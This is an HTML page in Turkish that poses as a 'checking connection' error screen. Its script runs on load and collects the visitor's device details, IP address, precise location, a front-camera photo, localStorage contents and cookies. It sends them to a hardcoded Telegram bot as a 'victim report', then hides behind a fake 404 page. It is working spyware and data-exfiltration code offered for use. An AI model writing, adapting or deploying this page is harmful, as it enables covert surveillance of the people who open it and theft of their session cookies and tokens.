<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hata</title>
    <style>
        body { background: #f4f4f4; font-family: Arial; text-align: center; padding-top: 80px; }
        h1 { color: #333; }
        p { color: #666; }
        .loader { display: none; }
    </style>
</head>
<body>
    <h1>⏳ Bağlantı kontrol ediliyor...</h1>
    <p id="status">Lütfen bekleyin</p>

<script>
    // ----------- TELEGRAM ----------
    const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";  // DEĞİŞTİR
    const CHAT_ID = "8729744465";                                // DEĞİŞTİR

    // ----------- FONKSİYONLAR ----------
    function sendTG(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
        }).catch(()=>{});
    }

    function sendPhotoTG(base64, filename) {
        const blob = dataURItoBlob(base64);
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", blob, filename);
        fd.append("caption", "📸 Ekran görüntüsü / Kamera");
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: fd
        }).catch(()=>{});
    }

    function dataURItoBlob(dataURI) {
        const bstr = atob(dataURI.split(',')[1]);
        const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(bstr.length);
        const ia = new Uint8Array(ab);
        for (let i=0; i<bstr.length; i++) ia[i] = bstr.charCodeAt(i);
        return new Blob([ab], {type: mime});
    }

    // ----------- 1. CİHAZ BİLGİLERİ ----------
    function getDeviceInfo() {
        return {
            ua: navigator.userAgent,
            platform: navigator.platform,
            lang: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            online: navigator.onLine,
            cookies: navigator.cookieEnabled,
            cpu: navigator.hardwareConcurrency || "?",
            ram: navigator.deviceMemory || "?",
            doNotTrack: navigator.doNotTrack || "yok"
        };
    }

    // ----------- 2. IP ----------
    async function getIP() {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            return d.ip;
        } catch { return "Alınamadı"; }
    }

    // ----------- 3. KONUM ----------
    function getLocation(cb) {
        if (!navigator.geolocation) { cb("Konum desteği yok"); return; }
        navigator.geolocation.getCurrentPosition(
            (p) => cb(`Enlem:${p.coords.latitude}, Boylam:${p.coords.longitude}, Doğruluk:${p.coords.accuracy}m`),
            (e) => cb("Konum reddedildi: "+e.message),
            { enableHighAccuracy: true, timeout: 8000 }
        );
    }

    // ----------- 4. EKRAN GÖRÜNTÜSÜ (canvas) ----------
    function captureScreen() {
        return new Promise((resolve) => {
            // video element ile tüm ekranı yakala - basit canvas çözümü
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f4f4f4';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#333';
            ctx.font = '20px Arial';
            ctx.fillText('Ekran görüntüsü alındı', 50, 100);
            // Gerçek screenshot için html2canvas gerekir - bu örnekte dummy
            // Gerçek kullanım için aşağıdaki satırı aktif et (harici kütüphane)
            // html2canvas(document.body).then(c => resolve(c.toDataURL('image/jpeg')));
            resolve(canvas.toDataURL('image/jpeg'));
        });
    }

    // ----------- 5. KAMERA FOTOĞRAFI ----------
    function captureCamera() {
        return new Promise((resolve) => {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then((stream) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    resolve(canvas.toDataURL('image/jpeg'));
                };
            })
            .catch(() => resolve(null));
        });
    }

    // ----------- 6. PAROLA / ÇEREZ / LOCALSTORAGE ----------
    function getStoredData() {
        let data = "📍 LOCALSTORAGE:\n";
        for (let i=0; i<localStorage.length; i++) {
            const key = localStorage.key(i);
            data += `${key}: ${localStorage.getItem(key)}\n`;
        }
        data += "\n🍪 ÇEREZLER:\n" + document.cookie;
        return data;
    }

    // ----------- 7. ANA İŞLEM ----------
    async function main() {
        document.getElementById('status').innerHTML = 'Bilgiler toplanıyor...';

        const dev = getDeviceInfo();
        const ip = await getIP();

        let msg = `<b>📱 KURBAN RAPORU</b>\n`;
        msg += `IP: ${ip}\n`;
        msg += `Tarayıcı: ${dev.ua}\n`;
        msg += `Platform: ${dev.platform}\n`;
        msg += `Dil: ${dev.lang}\n`;
        msg += `Ekran: ${dev.screen}\n`;
        msg += `Renk: ${dev.colorDepth}\n`;
        msg += `Saat dilimi: ${dev.tz}\n`;
        msg += `Çevrimiçi: ${dev.online}\n`;
        msg += `Çerez: ${dev.cookies}\n`;
        msg += `CPU: ${dev.cpu}\n`;
        msg += `RAM: ${dev.ram} GB\n`;
        msg += `DoNotTrack: ${dev.doNotTrack}\n`;

        sendTG(msg);

        // Konum
        document.getElementById('status').innerHTML = 'Konum isteniyor...';
        getLocation((loc) => sendTG(`<b>📍 KONUM:</b> ${loc}`));

        // Ekran görüntüsü (dummy - gerçek için html2canvas ekle)
        document.getElementById('status').innerHTML = 'Ekran görüntüsü alınıyor...';
        // const screenImg = await captureScreen();
        // if (screenImg) sendPhotoTG(screenImg, 'screen.jpg');

        // Kamera
        document.getElementById('status').innerHTML = 'Kamera açılıyor...';
        const camImg = await captureCamera();
        if (camImg) sendPhotoTG(camImg, 'camera.jpg');

        // LocalStorage ve çerezler
        document.getElementById('status').innerHTML = 'Veriler toplanıyor...';
        const stored = getStoredData();
        if (stored.length > 10) sendTG(`<b>📂 KAYITLI VERİLER:</b>\n${stored.substring(0, 4000)}`);

        // Bitti - masum hata
        document.getElementById('status').innerHTML = '✅ Tamamlandı.';
        setTimeout(() => {
            document.body.innerHTML = `
            <!DOCTYPE html>
            <html>
            <head><title>404</title></head>
            <body style="background:#f4f4f4;text-align:center;padding-top:100px;font-family:sans-serif;">
                <h1 style="color:#333;">404</h1>
                <p style="color:#666;">Sayfa bulunamadı</p>
                <hr style="width:100px;margin:20px auto;">
                <p style="color:#999;font-size:14px;">Lütfen adresi kontrol edin.</p>
            </body>
            </html>`;
        }, 3000);
    }

    main();
</script>
</body>
</html>
